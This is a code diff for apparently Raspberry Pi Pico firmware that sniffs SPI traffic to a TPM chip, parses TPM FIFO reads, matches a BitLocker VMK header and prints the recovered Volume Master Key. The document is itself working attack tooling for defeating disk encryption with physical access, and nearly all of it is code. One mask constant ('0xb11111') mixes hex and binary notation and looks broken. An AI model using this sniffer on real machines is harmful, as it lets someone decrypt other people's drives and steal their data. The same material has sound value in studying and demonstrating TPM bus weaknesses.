@@ -46,9 +46,21 @@ static inline uint32_t fetch(PIO pio, uint sm) {
 }
 
 
-static inline uint8_t fetch_message(PIO pio, uint sm) {
-    uint64_t mosi_msg=0x0;
-    uint64_t miso_msg=0x0;
+static inline uint8_t fetch_miso_byte(PIO pio, uint sm){
+    uint8_t miso_byte = 0x0;
+    uint16_t miso_msk = 0b1000000000000000;
+    uint32_t data = fetch(pio, sm);
+    for (int i = 0; i < 8; i++){
+        miso_byte = miso_byte | ((char) ((data & miso_msk) >> (8-i)));
+        miso_msk = miso_msk >> 2;
+    }
+    return miso_byte;
+}
+
+
+static inline uint16_t fetch_message(PIO pio, uint sm) {
+    uint32_t mosi_msg=0x0;
+    //uint32_t miso_msg=0x0;
     uint32_t data;
     bool init = true;
     //printf("[fetch_message] \n");
@@ -57,27 +69,30 @@ static inline uint8_t fetch_message(PIO pio, uint sm) {
         char miso_byte = 0x0;
         char mosi_byte = 0x0;
         uint16_t mosi_msk = 0b0100000000000000;
-        uint16_t miso_msk = 0b1000000000000000; 
+        //uint16_t miso_msk = 0b1000000000000000; 
         data = fetch(pio, sm);//( pio_sm_get_blocking(pio, sm) );
         // untangle DO and DI parts
         for (int i = 0; i < 8 ; i++)
         {   
-            miso_byte = miso_byte | ((char) ((data & miso_msk) >> (8-i))) ;
+            //miso_byte = miso_byte | ((char) ((data & miso_msk) >> (8-i))) ;
             mosi_byte = mosi_byte | ((char) ((data & mosi_msk) >> (7-i))) ;
-            miso_msk = miso_msk >> 2;
+            //miso_msk = miso_msk >> 2;
             mosi_msk = mosi_msk >> 2;
         }
         if (init) {
             mosi_msg = mosi_msg | mosi_byte;
-            miso_msg = miso_msg | miso_byte;    
+            //miso_msg = miso_msg | miso_byte;    
         }else{
             mosi_msg = (mosi_msg << 8) | mosi_byte;
-            miso_msg = (miso_msg << 8) | miso_byte;
+            //miso_msg = (miso_msg << 8) | miso_byte;
         }
         init = false;
-        if (!((mosi_msg & 0x00000000ff00ff00) == 0x00D4002400)) continue;
-        char message = (char) (miso_msg & 0xff);
-        return message;
+
+        if (!((mosi_msg & 0xf0ff00ff) == 0x80D40024)) continue; 
+        // Read FIFO_0 0x8XD40024 where X holds the number of bytes to be transferred
+        // 0b0000000 = 1 byte; 0b00000001 = 2 bytes ; 0b00000010 = 3 bytes etc. up to 64 bytes 
+        uint16_t bytes_to_read = (uint16_t) ((mosi_msg >> 24) & 0xb11111) + 1;
+        return bytes_to_read;
     }
 }
 
@@ -93,6 +108,7 @@ char message_buffer[4096*2];
 volatile size_t msg_buffer_ptr = 0;
 bool byte_found = false;
 
+
 void core1_entry() {
     PIO pio = pio0;
     uint offset = pio_add_program(pio, &spi_sniffer_program);
@@ -100,15 +116,14 @@ void core1_entry() {
     spi_sniffer_program_init(pio, sm, offset, BASE_PIN, JMP_PIN);
     
     while(1) {
-        char message = fetch_message(pio, sm);
-        if (!(message == 0x2c)) continue;
-	    //printf("[VMK header ...]\n");
-        message_buffer[msg_buffer_ptr++] = message;
-        multicore_fifo_push_blocking(msg_buffer_ptr);
-        for (int i = 0 ; i < 44; i++) {
-            message_buffer[msg_buffer_ptr++] = fetch_message(pio, sm);
+        uint16_t bytes_to_read = fetch_message(pio, sm);
+        for(int n=0; n < bytes_to_read; n++){
+            char message = fetch_miso_byte(pio,sm);
+            message_buffer[msg_buffer_ptr++] = message;
+	        if (!(message == 0x2c)) continue;
+	    	multicore_fifo_push_blocking(msg_buffer_ptr);
         }
-    }
+	}
 }
 
 
@@ -133,35 +148,42 @@ int main() {
     
     printf("[+] Ready to sniff!\n");
     float f = (float) clock_get_hz(clk_sys);
-    printf("[+] %f \n",f);
+    printf("[+] system clock frequency: %f Hz\n",f);
     
     multicore_launch_core1(core1_entry);
 
     while(1) {
         uint32_t popped = multicore_fifo_pop_blocking();
-	    //printf("[%d, %d]\n",popped,byte_found);
+	    // printf("[%d, %d]\n",popped,byte_found);
         // Wait til the msg_buffer_ptr is full
-        while((msg_buffer_ptr - popped) < 44) {
-        }
-        if(memcmp(message_buffer + popped, vmk_header, 12) == 0) {
+        while((msg_buffer_ptr - popped) < 44) {}
+        if ((memcmp(message_buffer + popped, vmk_header, 2) == 0) && \
+            (memcmp(message_buffer + popped + 3, vmk_header + 3, 1) == 0) && \
+            (memcmp(message_buffer + popped + 5, vmk_header + 5, 3) == 0) && \
+            (memcmp(message_buffer + popped + 9, vmk_header + 9, 3) == 0))
+        {    
             printf("[+] Bitlocker Volume Master Key found:\n");
-	    printf("[+] VMK Header: ");
-	    for (int i = 0; i < 12; i++)
-	    {
-	        printf("%02X ", message_buffer[popped + i]);
-	    }
+	        printf("[+] VMK Header: ");
+	        for (int i = 0; i < 12; i++)
+	        {
+	            printf("%02X ", message_buffer[popped + i]);
+	        }
 	    
-	    puts("");
-            for(int i=0; i < 2; i++) {
+	        puts("");
+            for(int i=0; i < 2; i++) 
+            {
                 printf("[+] ");
-                for(int j=0; j < 2; j++) {
-                    for(int k=0; k < 8; k++) {
+                for(int j=0; j < 2; j++) 
+                {
+                    for(int k=0; k < 8; k++) 
+                    {
                         printf("%02x ", message_buffer[popped + 12 + (i * 16) + (j * 8) + k]);
                     }
                     printf(" ");
                 }
                 puts("");
             }
+            
         }
     }
 }
